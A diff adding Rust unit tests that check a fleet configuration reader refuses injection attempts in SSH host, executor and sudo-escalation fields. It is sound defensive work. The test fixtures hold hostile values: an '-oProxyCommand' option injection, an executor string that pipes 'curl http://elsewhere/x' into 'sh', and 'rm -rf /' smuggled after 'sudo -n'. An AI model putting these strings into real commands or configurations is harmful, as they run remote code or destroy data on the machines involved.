@@ -234,3 +234,82 @@ ssh_config = "/home/somebody/.tbot/nerpa/ssh_config"
          configuration and needs nothing else: it is a route, not a transport"
     );
 }
+
+/// `ssh` hands its host to the local `ssh` binary as a positional argument, and
+/// `ssh` reads a leading `-` as another option — `-oProxyCommand=…` runs a
+/// command **here**, before any machine is contacted. A fleet is a document
+/// that gets swapped, shared and one day generated from a cloud inventory, so a
+/// name out of one must not be able to reach the control machine.
+#[test]
+fn a_host_that_would_be_read_as_an_option_is_refused() {
+    let refusal = Fleet::read(
+        r#"
+[nodes.web-01]
+ssh = "-oProxyCommand=touch /tmp/pwned"
+"#,
+    )
+    .expect_err("a host cannot begin with a dash");
+    assert!(
+        refusal.contains("web-01") && refusal.contains("option"),
+        "the refusal should name the node and what would happen: {refusal}"
+    );
+}
+
+/// `ssh` joins whatever trails the host into one string and hands it to a shell
+/// on the far side. An executor "path" holding a `;` is two commands there.
+#[test]
+fn an_executor_that_is_not_a_path_is_refused() {
+    let refusal = Fleet::read(
+        r#"
+[nodes.web-01]
+ssh = "web-01"
+executor = "/bin/true; curl http://elsewhere/x | sh"
+"#,
+    )
+    .expect_err("that is not a path");
+    assert!(
+        refusal.contains("executor"),
+        "the refusal should name the field: {refusal}"
+    );
+}
+
+#[test]
+fn an_escalation_that_is_not_a_command_is_refused() {
+    let refusal = Fleet::read(
+        r#"
+[nodes.web-01]
+ssh = "web-01"
+become = "sudo -n; rm -rf /"
+"#,
+    )
+    .expect_err("that is not an escalation");
+    assert!(
+        refusal.contains("become"),
+        "the refusal should name the field: {refusal}"
+    );
+}
+
+/// And the ordinary shapes still read: a host, an alias, an address, a user at
+/// a host, a path, and an escalation of several words.
+#[test]
+fn the_shapes_people_actually_write_still_read() {
+    let fleet = Fleet::read(
+        r#"
+[nodes.by-alias]
+ssh = "web-01"
+
+[nodes.by-name]
+ssh = "web-01.example.internal"
+
+[nodes.by-address]
+ssh = "192.0.2.34"
+
+[nodes.as-somebody]
+ssh = "nerpa@web-01.example.internal"
+executor = "/opt/nerpa/nerpa-executor"
+become = "sudo -n"
+"#,
+    )
+    .expect("nothing here is a way to run a command");
+    assert_eq!(fleet.len(), 4);
+}
